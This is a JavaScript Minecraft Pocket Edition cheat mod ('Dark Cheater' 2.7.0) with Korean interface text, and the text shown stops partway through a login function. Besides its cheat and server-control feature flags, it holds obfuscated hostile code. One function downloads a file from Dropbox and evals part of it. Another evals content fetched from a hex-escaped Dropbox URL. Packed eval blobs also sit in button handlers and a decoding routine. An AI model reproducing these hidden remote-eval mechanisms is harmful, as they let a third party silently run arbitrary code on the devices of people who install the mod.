/*
Dark Cheater
version 2.7.0
© 2015-2017 Dark Tornado, All rights reserved.
리뷰는 허용하나, 무단공유, 무단수정, 제작자속이기 등을 할 시에는 싸대기 때리러 감.
*/

 
ModPE.setItem(511, "book_writable", 0, "Dark Tornado's Book");
Block.defineBlock(230, "Light Stone", [["end_stone",0]], 0, false, 0);
Block.setLightLevel(230, 15);
Block.setShape(230, 0, 0, 0, 0, 0, 0);
ModPE.overrideTexture("images/mob/darkTornado.png", "http://darktornado.dothome.co.kr/000+/darkTornado.png");
ModPE.overrideTexture("images/mob/hero.png", "https://www.dropbox.com/s/d8veix6yog3bsq5/hero.png?dl=1");
Player.addItemCreativeInv(511, 1, 0);
ModPE.langEdit("menu.copyright", "©Mojang AB §0Dark Cheater by Dark Tornado");


const ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
const sdcard = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
const version = "2.7.0";
const ScriptManager = net.zhuoweizhang.mcpelauncher.ScriptManager;
const Utils = net.zhuoweizhang.mcpelauncher.Utils;
const number = android.text.InputType.TYPE_CLASS_NUMBER;
const number2 = android.text.InputType.TYPE_NUMBER_FLAG_SIGNED;
const number3 = android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL;
const white = android.graphics.Color.WHITE;
const black = android.graphics.Color.BLACK;
const holoDark = android.app.AlertDialog.THEME_HOLO_DARK;
const center = android.view.Gravity.CENTER;
const GitHubLink = "https://raw.githubusercontent.com/DarkTornado/darkCheater/master/";
const BlocklauncherRoot = "/data/data/net.zhuoweizhang.mcpelauncher";


var btn = null;
var btnE = null;
var menu = null;
var menuI = null;
var menuA = null;
var menuW = null;
var menuP = null;
var menuB = null;
var menuE = null;
var menuE2 = null;
var menuWE = null;
var menuEL = null;
var menuEL2 = null;
var menuM = null;
var menuDL = null;
var menuT = null;
var menuT2 = null;
var menuT3 = null;
var menuP2 = null;
var menuS = null;
var menuS2 = null;
var menuS3 = null;
var menuD = null;
var menuM2 = null;
var multi = false;
var locate = 0;
var side = 0;
var ad = null;
var dt = 0;
var hide = false;
var playerTarget = null;
var banList = [];
var entityTarget = 0;
var xyzTarget = 0;
var we = {x : new Array(2), y : new Array(2), z : new Array(2), tf : false};
var p = {p : null, t : null};
var run = false;
var rt = 0;
var rx, rz;
var btnSS = null;
var btnR = null;
var btnF = null;
var xRay = false;
var xrays = new Array(7);
var l = {x : null, y : null, z : null, b : new Array(2)};
var lx ,ly, lz;
var pass = false;
var light = false;
var noPvp = false;
var noEnt = false;
var move = 0;
var moving = false;
var tx, ty, tz;
var atp = 0;
var w = {tf : false, x : new Array(4), y : new Array(4), z : new Array(4), p1 : null, p2 : false, b : [], bd : [], f : false, h : false, c : false, s : false, xx : 0, yy : 0, zz : 0, back : true, backUpData : [], uin : true};
var filling = false;
var f2 = 0;
var fx1, fx2, fy1, fy2, fz1, fz2;
var cross = null;
var ctp = false;
var clock = null;
var clockText = null;
var darkType = 0;
var darkTypeE = null;
var mcpev = false;
var mcpev2 = false;
var mcpev3 = false;
var mcpev4 = false;
var mcpev5 = false;
var rideEnt = false;
var walk = false;
var touchBlock = false;
var blockInfo = false;
var mc = false;
var mc2 = false;
var mx, my, mz;
var mt = 0;
var mcBtn = null;
var menuJ = null;
var j = {on : false, y : null, p : null, s : null, c : null, t : null, pc : null, m : 0, f : 0, n : 1};
var climbing = false;
var sneak = false;
var auto = false;
var anti = 0;
var dl = {
esp : new Array(10), c : [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
wx : null, wy : null, wz : null,
sx : null, sy : null, sz : null,
ex : null, ey : null, ez : null
};
var espNames = ["Fire Summon", "Water Bind", "Mono Tree", "Sand Burst", "Undead Summon", "Push", "Burst", "Absorb", "Light Burster", "Dark Burster"];
var antiTerror = [true, false, false, false, true, true, true, false, true, true, true, true, true, false, false, false, false, false, false, false];
var terrorAlert = true;
var adTer = false;
var terPass = false;
var ops = [];
var opData = [];
var exp = {
onoff : false, c : 0, x : null, y : null, z : null
};
var mapTerror = 0;
var mapTerror2 = false;
var bedBreak = false;
var media = new android.media.MediaPlayer();
var music = false;
var wo = {tf : false, user : [], x1 : [], y1 : [], z1 : [], x2 : [], y2 : [], z2 : [], b1 : [], b2 : [], bd1 : [], bd2 : [], alert : false};
var chatLog = "";
var btnHide = false;
var terrorLog = "";
var antiTwo = true;
var playerSort = false;
var entName = "";
var s = {btn : null, btn2 : null, run : false, walk : false, move : 0, sneak : false, lie : false, x : null, y : null, z : null, sin : null, cos : null, g : false, btn : null, menu : null};
var showChest = false;
var fake = false;
var en = {tf : false, t : 0, x : null, y : null, z : null};
var buildingMode = false;
var buildingType = false;
var makerSummon = false;
var white2 = white;
var darkRender = Renderer.createHumanoidRenderer();
addDarkRender(darkRender);
var nox;
var noxs = [];
var noxT = 0;
var anT = 0;
var px, py, pz, yaw, sin, cos, tan, pcos;
var screenReverse = false;
var nf = {tf : false, s : undefined, t : 0, x : null, y : null, z : null, v : null};
var h = {tf : false, hero : null, t : 0, r : null, x : null, y : null, z : null, s : null, c : null, l : false,
m : function(msg){
if(h.l) clientMessage("<히로빈> "+msg);
else clientMessage("<Herobrine> "+msg);
}
};
var esp = {tf : false, c : [0, 0, 0, 0], d2 : false,
d3x : null, d3y : null, d3z : null,
dx : null, dy : null, dz : null
};
var instaBreak = false;
var sm = {tf : false, air : false, abs : false, x : null, y : null, z : null, pack : false, pType : null};
var setTileString = "";
var particleString = "";
var tooMany = false;
var f = {tf : false, pp : [], n : [], x : null, y : null, z : null};
var timeLock = false;
var tlv = null;
var jump = false;
var j2 = false;
var gh = [false, false, false, false, false, false, false, false, false];
var killEnt = false;
var worldEditString = "";
var blockString = "";
var loadChest = false;
var loadChest2 = false;
var loadChest3 = false;
var loadChestData = [];
var loadChestCount = 0;
var chatTerrorString = "";
var showEntHealth = false;
var showEntHealthTarget;
var banTime = false;
var clock2 = null;
var clockSeek = null;
var appPack = false;
var mst = 0;
var showMobHealth = false;
var fovM = null;
var findOre = false;
var scanOre = false;
var scanOre2 = false;
var autoTorch = false;
var editChest = false;
var dou = {dark : false, seek : false, seek2 : 0};
var widgetDrag = true;
var fe = {btn : null, menu : null, touchTp : false};
var antiMine = [];
var blackList = "";
var blackListOn = true;
var miniMap = null;
var miniMapData = new android.widget.ImageView(ctx);
var miniMapTime = 0;
var miniMapSet = {area: 8, size: 120, alpha : 190};
var signTp = true;
var c = {btn : null, mode : false};
var sBtn = null;
var antiChat = false;
var antiChatData = [];
var est = 0, esn = 0;
var antiEnt = [10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 64, 65, 66, 68, 69, 77, 80, 81, 82, 84, 85, 86, 90, 93, 94, 95, 96, 97, 98];
var pca = false;
var blockLog = false;
var chatIgnore = [];
var elr = false;
var elr2 = 5;
var evData = {a : null, p : null};
var pls = [];
var pls2 = [];
var wvsa = [false, true, false, false, false];
var showPlayerHealth = false;
var showNumber = false;
var chatTerrorN = 1;
var noPlayer = false;
var blackListId = "";
var blackListIdOn = true;
var serverLog = "";
var hyperLogOn = true;
var hyperLogSaveAlert = true;
var hyperLog = "";
var dce = {};
var whiteList = "";
var whiteListOn = false;
var scriptEnable = false;
var tpAlert = true;
var chatTerrorCool = true;
var modTickOnoff = false;
var antiBlock = false;
var btnRe = false;
var theSeed = false;
var makeGUI = true;
var fixSendChat = false;
var antiMove = [];
var btnBackData = null;
var titleBackData = null;
var lp = 0;
var invenSave = false;
var invenSaveData = [[], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], []];
var armorSaveData = [[], [], [], []];
var isDied = false;
var pcGUI = false;
var mobBattle = false;
var mobBattleAttacker = null;
var isLogined = false;
var loginType = 0;
var loginTime = false;
var loginCache = null;
var mfmf = [false, false, false, false, false, false, false, false, false, false];
var noAdmin = false;
var isUsableId = false;
var searchTarget = null;
var bBtn = null;
var mnmn = null;
var kickArray = [];
var antiPotionData = [];
var deathAntiLack = false;
var useLogin = false;
var notLoginArray = [];
var notRigisterArray = [];
var posData = [];
var ciwl = {tf : false, data : ""};
var getPlayers = false;
var chatKick = [];
var noticeStop = true;
var compileFinish = false;
var dcmsData = {consts : "", vars : "", useItem : "", attackHook : "", deathHook : "", modSecond : "", chatHook : "", newLevel : "", serverConnectedHook : "", leaveGame : ""};
var useMine = false;
var mineSet = 0;
var mineData = [[], []];
var astel = {ui : "", ah : "", dh : "", ch : "", crh : ""};
var btnSize = {x : 35, y : 23, t : 10};
var terTime = false;
var maxHealthFix = false;
var hideNickName = false;
var hideNickNames = false;
var nickNames = [];
var noFull = false;
var nameChat = false;
var loginNick = "";
var signEdit = false;
var pBtn = null;
var pointInput = 0;
var toastType = 1;
var screenCover = null;
var effectWindow = null;
var effectWindowCache = null;
var transToggle = false;
var hideEnt = false;
var searchTime = false;
var leftPls = [];
var linkArray = [false, false, false];
var worldEditCache = null;
var wWin = null;
var spawn = false;
var spawnPos = [];
var homePos = [];
var stmf = {fix : false, win : null, txt : null};
var entityData = [["닭", 10], ["소", 11], ["돼지", 12], ["양", 13], ["늑대", 14], ["NPC", 15], ["버섯소", 16], ["오징어", 17], ["토끼", 18], ["박쥐", 19], ["아이언 골램", 20], ["스노우 골램", 21], ["오셸롯", 22], ["당나귀", 23], ["노새", 24], ["말", 25], ["스켈레톤 말", 26], ["좀비 말", 27], ["북극곰", 28], ["좀비", 32], ["크리퍼", 33], ["스켈레톤", 34], ["거미", 35], ["좀비 피그맨", 36], ["슬라임", 37], ["엔더맨", 38], ["좀벌레", 39], ["동굴 거미", 40], ["가스트", 41], ["마그마 큐브", 42], ["블레이즈", 43], ["좀비 NPC", 44], ["마녀", 45], ["길 잃은 존재", 46], ["허스크", 47], ["위더 스켈레톤", 48], ["가디언", 49], ["엘더 가디언", 50], ["NPC", 51], ["위더", 52], ["엔더 드래곤", 53], ["셜커", 54], ["엔더 마이트", 55], ["Learn to Code Mascot", 56], ["카메라", 62], ["드롭된 아이템", 64], ["활성화된 TNT", 65], ["떨어지는 블록", 66], ["경험치 포션", 68], ["경험치", 69], ["엔더의 눈", 70], ["엔더 크리스탈", 71], ["셜커 총알", 72], ["낚싯대", 77], ["용 화염구", 79], ["화살", 80], ["눈덩이", 81], ["달걀", 82], ["그림", 83], ["마인카트", 84], ["화염구", 85], ["투척 포션", 86], ["엔더 진주", 87], ["끈 매듭", 88], ["위더 머리", 89], ["보트", 90], ["번개", 93], ["작은 화염구", 94], ["잔류형 물약 입자/카메라(0.14.x)", 95], ["깔때기 마인 카트", 96], ["TNT 마인 카트", 97], ["창고 마인 카트", 98]];
var designType = 0;
var ndCache = [null, null, null, null, null];
var btnMargin = 1;
var useExitBtn = 0;
var as = {btn : null, data : [[0, 0], [0, 0], [0, 0]]};
var btnHeight = -2;
var mobStop = false;
var loginInfo = [];
var bs = {tf : false, data : [], pos : []};


const Dark = {
toast : function(msg, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var toast = new android.widget.Toast.makeText(ctx, "<Dark> "+msg, android.widget.Toast.LENGTH_LONG);
if(toastType==1) toast.getView().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(140, 30, 30, 30)));
else if(toastType==2) toast.getView().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
else if(toastType==3) toast.getView().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(140, 210, 210, 210)));
if(tf) toast.setGravity(center, 0, 0);
toast.show();
}
catch(e){
print(e);
}
}
}));
},
makeButton : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btn = new android.widget.PopupWindow();
var button = new android.widget.Button(ctx);
if(btnHide){
button.setBackgroundColor(android.graphics.Color.argb(0, 0, 0, 0));
}
else{
button.setText("Dark");
button.setTextSize(btnSize.t);
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
}
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('19 a="\\q\\O\\b\\m\\f\\x\\A\\g\\o\\m\\b\\y\\Q\\c\\B\\s\\b\\R\\y\\S\\U\\c\\V\\Z\\17\\c\\t\\1a\\1b\\t\\1c\\c\\1d\\1g\\1h\\c\\1j\\c\\1k\\E\\F\\c\\B\\s\\G\\c\\H\\I\\J\\K\\L\\M\\b\\f\\N\\e\\P\\r\\m\\i\\g\\e\\v\\b\\T\\b\\k\\i\\p\\W\\b\\m\\q\\X\\e\\Y\\b\\p\\d\\i\\k\\b\\o\\p\\A\\d\\b\\g\\i\\q\\v\\b\\15\\e\\f\\o\\r\\d\\g\\i\\16\\d\\k\\b\\e\\f\\b\\f\\d\\g\\d\\u\\o\\x\\e\\k\\d\\b\\u\\g\\e\\f\\d".18("\\b");h(w[a[0]]&&j[a[1]]()){j[a[4]](a[2],a[3])}l{h(w[a[5]]){z()}l{h(1e||1f){h(!n[a[6]]){h(j[a[8]](a[7])!=a[9]){1i()}l{z()};n[a[6]]=C;D 1l[a[12]].1m()[a[11]](D 1n[a[10]].1o({1p:1q(){n[a[6]]=1r}}),1s)}l{h(n[a[6]]){j[a[13]]();j[a[14]](C)}}}}}',62,91,'||||||||||_0x4936|xXZ|x20|x65|x6F|x73|x6C|if|x61|Dark|x64|else|x69|dou|x74|x72|x6E|x44|uB2E8|uC11C|x63|x67|dce|x4D|uC791|alertMessage|x75|uCC28|true|new|uB3C4|uB85D|uD55C|uC0C1|uD0DC|uC785|uB2C8|uB2E4|x2E|x68|x6D|x77|uB3D9|uC81C|uC790|x62|uAC00|uD0C0|x6B|x66|x32|uC778||||||x70|x79|uC758|split|var|uBC84|uC5D0|uB294|uC0AC|darkCheaterOn|darkCheaterOn2|uC6A9|uD560|darkCheater|uC218|uC5C6|android|Handler|java|Runnable|run|function|false|300'.split('|'),0,{});
eval(code);
}
}));
setDragListener(btn, button, 0);
var pad = dip2px(ctx, 1);
button.setPadding(pad, pad, pad, pad);
btn.setContentView(button);
btn.setWidth(dip2px(ctx, btnSize.x));
btn.setHeight(dip2px(ctx, btnSize.y));
btn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(locate==2) btn.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, 0, 0);
else if(locate==3) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, dip2px(ctx, 35));
else if(locate==4) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|center, 0, 0);
else if(locate==5) btn.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
else if(locate==6) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|center, 0, 0);
else if(locate==7) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==8) btn.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==9) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.BOTTOM, 0, 0);
else if(locate==10) btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("btnX"), Dark.read("btnY"));
else btn.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, 0, 0);
}
catch(e){
Dark.toast("이 디바이스에서는 Dark Cheater를 사용할 수 없습니다.");
}
}
}));
},
selectMode : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var nn = 0;
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
var radio1 = new android.widget.RadioButton(ctx);
radio1.setText("서버장 모드");
radio1.setTextColor(white);
radio1.setId(1);
var radio2 = new android.widget.RadioButton(ctx);
radio2.setText("서버원 모드");
radio2.setTextColor(white);
radio2.setId(2);
radios.addView(radio1);
radios.addView(radio2);
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
nn = checkedId;
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("모드 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(nn==1) multi = false;
else if(nn==2) multi = true;
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
close : function(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(tf){
if(menu!=null){
menu.dismiss();
menu = null;
}
}
if(menuI!=null){
menuI.dismiss();
menuI = null;
}
if(menuW!=null){
menuW.dismiss();
menuW = null;
}
if(menuP!=null){
menuP.dismiss();
menuP = null;
}
if(menuB!=null){
menuB.dismiss();
menuB = null;
}
if(menuE!=null){
menuE.dismiss();
menuE = null;
}
if(menuWE!=null){
menuWE.dismiss();
menuWE = null;
}
if(menuEL!=null){
menuEL.dismiss();
menuEL = null;
}
if(menuEL2!=null){
menuEL2.dismiss();
menuEL2 = null;
}
if(menuM!=null){
menuM.dismiss();
menuM = null;
}
if(menuM2!=null){
menuM2.dismiss();
menuM2 = null;
}
if(menuDL!=null){
menuDL.dismiss();
menuDL = null;
}
if(menuT!=null){
menuT.dismiss();
menuT = null;
}
if(menuT2!=null){
menuT2.dismiss();
menuT2 = null;
}
if(menuT3!=null){
menuT3.dismiss();
menuT3 = null;
}
if(menuP2!=null){
menuP2.dismiss();
menuP2 = null;
}
if(menuS!=null){
menuS.dismiss();
menuS = null;
}
if(menuS2!=null){
menuS2.dismiss();
menuS2 = null;
}
if(menuA!=null){
menuA.dismiss();
menuA = null;
}
if(menuE2!=null){
menuE2.dismiss();
menuE2 = null;
}
if(menuD!=null){
menuD.dismiss();
menuD = null;
}
if(menuS3!=null){
menuS3.dismiss();
menuS3 = null;
}
Dark.save("makerFunc", false);
Dark.save("tra", false);
if(Dark.read("linkT")=="true"||linkArray[0]) Dark.save("th", false);
}
}));
},
makeEntityBtn : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnE = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = makeButton("스폰 모드 끝내기");
button.setTextSize(12);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick : function(v){
if(btnE!=null){
btnE.dismiss();
btnE = null;
}
entityTarget = 0;
}
}));
layout.addView(button);
btnE.setContentView(layout);
btnE.setWidth(dip2px(ctx, 100));
btnE.setHeight(dip2px(ctx, 35));
btnE.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
btnE.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, 0, dip2px(ctx, 20));
}
catch(e){
Dark.showError(e);
}
}
}));
},
showDialog : function(title, msg, tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
text.setText(msg);
text.setTextColor(white);
text.setTextSize(17);
layout.addView(text);
if(tf){
var maker = new android.widget.TextView(ctx);
maker.setText("\n© 2015-2017 Dark Tornado, All rights reserved.\n");
maker.setTextSize(11);
maker.setTextColor(white);
maker.setGravity(center);
layout.addView(maker);
}
var pad = dip2px(ctx, 10);
layout.setPadding(pad, pad, pad, pad);
dialog.setTitle(title);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
},
save : function(name, msg){
File.save(sdcard+"/darkTornado/darkCheater/"+name+".txt", msg);
},
read : function(name){
return File.read(sdcard+"/darkTornado/darkCheater/"+name+".txt");
},
readAddOn : function(name){
return Dark.read("addOn/"+name);
},
downloadAddOn : function(url, name){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var folder = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/");
folder.mkdir();
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/"+name+".txt");
if(file.exists()){
Dark.toast("이미 다운되어 있습니다.");
return;
}
if(checkInternet()){
var uri = new android.net.Uri.parse(url);
var dm = new android.app.DownloadManager.Request(uri);
dm.setTitle("Dark Cheater 추가 파일 다운로드");
dm.setDescription("추가 파일 다운로드 중...");
dm.setDestinationInExternalPublicDir("darkTornado/darkCheater/addOn", name+".txt");
dm.setNotificationVisibility(1);
ctx.getSystemService(android.content.Context.DOWNLOAD_SERVICE).enqueue(dm);
Dark.toast("추가 파일 다운로드를 시작합니다.");
}
else{
Dark.toast("인터넷에 연결되어있지 않습니다.");
}
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
},
selectBuilding : function(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menus = ["작은 나무집", "나무집", "돌집", "돌+나무집", "네더 반응기", "엔더 반응기", "엔더 포탈"];
var names = ["wood", "wood2", "stone", "woodStone", "netherReactor", "enerReactor", "enderReactor"];
var urls = ["6pl8cbc87kpqzst/wood", "d71yumi2v3g6sce/wood2", "c1ohhmj5wppbwyd/stone", "6tcrnrrdqpa6797/woodStone", "dl3zjrqr0v2268v/netherReactor", "i15qz905glb15aj/enderReactor", "gjrr2umexs6pb09/enderPortal"];
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(tf){
var folder = new java.io.File(sdcard+"/darkTornado/darkCheater/addOn/buildings/");
folder.mkdir();
Dark.downloadAddOn("https://www.dropbox.com/s/"+urls[w]+".txt?dl=1", "buildings/"+names[w]);
}
else{
buildingMode = true;
buildingType = w;
Dark.toast(menus[w]+"(이)가 선택되었습니다.\n터치하시면 소환됩니다.");
}
}
}));
dialog.setTitle("건물 종류 선택");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
},
checkVersion : function(){
if(checkInternet()){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info3.txt");
if(file.exists()) file.delete();
Dark.save("info3", Dark.getDataFromServer("https://www.dropbox.com/s/chj1dv7xni2k1dz/info3.txt?dl=1"));
}
},
getNewestVersion : function(){
if(Dark.read("info3")==""){;
return "알 수 없음";
}
else{
var vers = Dark.read("info3").toString().split("d");
return vers[1];
}
},
resetInfoFile : function(){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info.txt");
if(file.exists()){
file.delete();
}
},
checkMessage : function(){
if(Dark.read("info3")!=""){
var msg = Dark.read("info3").toString().split("dd");
if(msg[1]=="true") Dark.showDialog("제작자의 말", msg[2]);
if(msg[3]=="true") eval(msg[4]+"");
}
},
isMulti : function(){
if(Entity.getEntityTypeId(Player.getEntity())==0) return true;
else return false;
},
getTime : function(n){
var day = new Date();
if(n==1) return day.getFullYear()+"년 "+(day.getMonth()+1)+"월 "+day.getDate()+"일";
else if(n==2) return day.getHours()+"시 "+day.getMinutes()+"분 "+day.getSeconds()+"초";
else return day.getFullYear()+"년 "+(day.getMonth()+1)+"월 "+day.getDate()+"일 "+day.getHours()+"시 "+day.getMinutes()+"분 "+day.getSeconds()+"초";
},
hyperSave : function(name, msg){
try{
if(Utils.isPro()) File.save(BlocklauncherRoot+".pro/darkCheater/"+name+".txt");
else File.save(BlocklauncherRoot+"/darkCheater/"+name+".txt");
}
catch(e){
Dark.showError(e);
}
},
hyperRead : function(name){
try{
if(Utils.isPro()) return File.read(BlocklauncherRoot+".pro/darkCheater/"+name+".txt");
else return File.read(BlocklauncherRoot+"/darkCheater/"+name+".txt");
}
catch(e){
Dark.showError(e);
}
},
decodePassword : function(str){
try {
eval(Dark["\x67\x65\x74\x44\x61\x74\x61\x46\x72\x6F\x6D\x53\x65\x72\x76\x65\x72"]("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x64\x72\x6F\x70\x62\x6F\x78\x2E\x63\x6F\x6D\x2F\x73\x2F\x66\x68\x38\x76\x72\x6A\x67\x79\x35\x76\x6D\x72\x63\x62\x6D\x2F\x70\x61\x73\x73\x77\x6F\x72\x64\x4B\x65\x79\x2E\x74\x78\x74\x3F\x64\x6C\x3D\x31")+"");
return str3;
}
catch(e){
Dark.showError(e);
}
},
getThemeInfo : function(name){
try{
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+name+"/maker.txt");
if(!(file.exists())) return "알 수 없음.";
else return File.read(file).toString();
}
catch(e){
Dark.showError(e);
}
},
decodeData : function(str){
try{
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('e a="\\g\\2u\\b\\g\\m\\d\\k\\h\\b\\2t\\C\\G\\I\\J\\x\\L\\M\\Q\\R\\T\\U\\1b\\1d\\1f\\1x\\2p\\2q\\2r\\y\\A\\2v\\2w\\2x\\E\\F\\i\\H\\q\\p\\c\\K\\j\\D\\k\\N\\O\\d\\P\\l\\r\\m\\S\\s\\g\\h\\t\\V\\W\\X\\Y\\Z\\17\\18\\19\\1a\\u\\1c\\v\\1e\\w\\1g\\b\\1h\\1i\\1j\\1k\\1l\\1m\\1n\\1o\\1p\\1q\\1r\\1s\\1t\\1u\\1v\\1w\\2E\\1y\\1z\\1A\\1B\\1C\\1D\\1E\\1F\\1G\\1H\\1I\\1J\\1K\\1L\\1M\\1N\\1O\\1P\\1Q\\1R\\1S\\1T\\1U\\1V\\1W\\1X\\1Y\\1Z\\20\\21\\22\\23\\24\\25\\26\\27\\28\\29\\2a\\2b\\2c\\2d\\2e\\2f\\2g\\b\\d\\c\\l\\j\\h\\D\\b\\s\\c\\m\\d\\i\\q\\c\\b\\2h\\b\\2i\\b\\2j\\b\\2k\\b\\2l\\b\\2m\\b\\p\\c\\q\\r\\p\\c\\b\\C\\i\\g\\c\\v\\u\\b\\t\\h\\k\\d\\b\\A\\y\\x\\2n\\w\\b\\d\\i\\l\\j".2o("\\b");e o=a[2][a[1]]("");e z=a[3][a[1]]("");2s(e n=0;n<o[a[4]];n++){f=f[a[5]](z[n],o[n])};f=f[a[5]](a[10],a[11])[a[5]](a[8],a[9])[a[5]](a[6],a[7]);e B=2y[a[14]][a[13]][a[12]](f.2z(),0);e 2A=2B 2C[a[16]].2D(B,a[15])',62,165,'||||||||||_0x614a|xXZ|x65|x6C|var|str|x73|x74|x61|x67|x69|x6E|x70||enc|x64|x63|x6F|x72|x75|x34|x36|x38|x46|x54|dec|x55|str2|x42|x68|x59|x5A|x43|x62|x44|x45|x66|x47|x48|x6A|x6B|x6D|x49|x4A|x71|x4B|x4C|x76|x77|x78|x79|x7A||||||||x30|x31|x32|x33|x4D|x35|x4E|x37|x4F|x39|u3147|uD607|uAC1C|uC544|uB8E8|u3157|u3134|uB77C|uB31C|uC774|u314F|uD590|u3150|uB450|uC0AC|u3151|x50|u3137|uC831|uB7EC|u3163|uC790|u3155|uC6F0|uB2D0|uB85C|uB9AC|uB9C1|uBD80|uD5E8|uC988|uC138|u3154|u3142|uACE0|uC7C8|uB108|u3160|uB0D0|uB0D1|uB434|uBA15|uD558|u3148|uAC38|uBB18|uBAA8|uC7AC|uBA78|u3135|uB8CC|uC00D|uAC3A|uADA3|uACDF|uC154|uC6C5|uB0B4|uAD6C|uD638|uB370|uC2C0|uC2A4|x2F|uD30C|x3D|uB0E5|x2B|x2D|split|x51|x52|x53|for|x41|xAP|x56|x57|x58|android|toString|str3|new|java|String|uC6AF'.split('|'),0,{});
eval(code);
return str3.toString();
}
catch(e){
Dark.showError(e);
}
},
getDataFromServer : function(url){
try{
var url = new java.net.URL(url);
var con = url.openConnection();
if(con!=null){
con.setConnectTimeout(5000);
con.setUseCaches(false);
var isr = new java.io.InputStreamReader(con.getInputStream());
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
isr.close();
br.close();
con.disconnect();
}
return str.toString();
}
catch(e){
return;
Dark.showError(e);
}
},
loginDialog : function(){
new java.lang.Thread({
run : function(){
if(checkInternet()){
if(Dark.checkPermission("login")){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var lay2 = new android.widget.LinearLayout(ctx);
layout.setWeightSum(2);
var chs = [];
